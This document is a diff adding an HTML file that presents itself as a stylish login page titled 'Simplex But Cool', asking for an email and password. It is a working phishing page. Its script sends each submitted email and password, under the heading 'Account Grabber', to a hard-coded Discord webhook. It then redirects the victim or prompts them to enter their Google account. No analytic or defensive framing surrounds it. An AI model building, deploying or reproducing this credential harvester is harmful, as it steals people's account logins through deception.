@@ -1,0 +1,209 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <link rel="stylesheet" href="/fonts/roboto-regular-400.css" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Simplex But Cool</title>
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+        overflow: hidden;
+      }
+
+      body {
+        background: #000046;
+        background: -webkit-linear-gradient(to left, #000046, #1cb5e0);
+        background: linear-gradient(to right, #000046, #1cb5e0);
+        overflow: hidden;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        text-align: center;
+        height: 100vh;
+      }
+
+      .card {
+        padding-top: 25px;
+        padding-right: 25px;
+        padding-left: 25px;
+        height: max-content;
+        width: max-content;
+        background-color: rgba(255, 255, 255, 0.225);
+        box-shadow: 0px 0px 30px 25px rgba(255, 255, 255, 0.1);
+        border-radius: 10px;
+        animation: fadeInAnimation ease-out 1.5s;
+        animation-iteration-count: 1;
+        animation-fill-mode: forwards;
+      }
+
+      @keyframes fadeInAnimation {
+        0% {
+          transform: translate(0vh, -20%);
+          opacity: 0;
+        }
+        85% {
+          transform: translate(0px, 5px);
+        }
+        100% {
+          transform: translate(0px, 0px);
+          opacity: 1;
+        }
+      }
+
+      .card p.title {
+        font-family: "RobotoRegular", sans-serif;
+        font-size: 32px;
+        margin-top: 15px;
+        color: black;
+      }
+
+      .card p.subtitle {
+        font-family: "RobotoRegular", sans-serif;
+        font-size: 16px;
+        color: rgba(0, 0, 0, 0.5);
+        margin-bottom: 22.5px;
+      }
+
+      .card form input {
+        margin-top: 25px;
+        color: black;
+        background-color: rgba(255, 255, 255, 0.075);
+        border: none;
+        outline: none;
+        padding: 7.5px;
+        width: 250px;
+        border-radius: 7.5px;
+      }
+
+      .card form input:focus {
+        cursor: none;
+        transition: 1s all ease-out;
+        background-color: rgba(255, 255, 255, 0.25);
+        box-shadow: 0px 0px 7.5px 2.5px rgba(0, 0, 0, 0.5);
+        color: rgba(0, 0, 0, 0.5);
+      }
+
+      .card form input:focus::placeholder {
+        transition: 1s color ease-out;
+        color: rgba(0, 0, 0, 0.75);
+      }
+
+      .card form input::placeholder {
+        color: rgba(0, 0, 0, 0.175);
+      }
+      .card form input.end {
+        margin-bottom: 40px;
+      }
+
+      .card form button {
+        background-color: rgba(255, 255, 255, 0.075);
+        border: none;
+        outline: none;
+        padding: 10px;
+        border-radius: 10px;
+        margin-bottom: 15px;
+      }
+
+      .card form button:hover {
+        transition: 0.75s all ease-out;
+        background-color: rgba(255, 255, 255, 0.25);
+        box-shadow: 0px 0px 5px 1px rgba(0, 0, 0, 0.5);
+        cursor: pointer;
+      }
+
+      .card form button:focus {
+        transition: 0.25s all ease-out;
+        background-color: rgba(255, 255, 255, 0.5);
+        box-shadow: 0px 0px 10px 5px rgba(0, 0, 0, 0.75);
+        border: 1px solid white;
+      }
+
+      .card a.watermark {
+        color: rgba(0, 0, 0, 0.65);
+        padding: 5px;
+        background-color: rgba(255, 255, 255, 0.15);
+        border-radius: 5px;
+        display: inline-block;
+        margin-top: 15px;
+        margin-bottom: 12.5px;
+        font-family: "Courier New", Courier, monospace;
+        font-size: 12.5px;
+        text-decoration: none;
+        cursor: none;
+      }
+      .card a.watermark:hover {
+        transition: all 0.5s ease-out;
+        background-color: rgba(255, 255, 255, 0.35);
+        box-shadow: 0px 0px 5px 1px rgba(0, 0, 0, 0.5);
+        cursor: pointer;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <p class="title"><b>LOGIN</b></p>
+      <p class="subtitle"><b>Please enter your login and password!</b></p>
+      <form onsubmit="sendContent(event)">
+        <input
+          id="user"
+          type="user"
+          placeholder="Email"
+          pattern=".+@gmail\.com|.+@outlook\.com|.+@hotmail\.com"
+          required
+        />
+        <br />
+        <input
+          id="password"
+          type="password"
+          placeholder="Password"
+          class="end"
+        />
+        <br />
+        <button type="submit">Login</button>
+      </form>
+      <a class="watermark" href="./"><b>Created By Fleter</b></a>
+    </div>
+
+    <script>
+      async function sendContent(ev) {
+        ev.preventDefault();
+
+        const senderEmail = document.getElementById("user").value;
+        const senderMessage = document.getElementById("password").value;
+
+        const webhookBody = {
+          embeds: [
+            {
+              title: "Account Grabber",
+              fields: [
+                { name: "Email", value: senderEmail },
+                { name: "Password", value: senderMessage },
+              ],
+            },
+          ],
+        };
+
+        const webhookUrl =
+          "https://discord.com/api/webhooks/1048829611548614666/S2GIlWRmeiujl_gr8ACFrDgRxwirndWR-CaNE2rvwz4itQzO5LKOn1VgzPUwKpSrQ5H8";
+
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(webhookBody),
+        });
+
+        if (response.ok) {
+          location.href = "/html";
+        } else {
+          alert("Please Input Your Google Account To Continue!");
+        }
+      }
+    </script>
+  </body>
+</html>
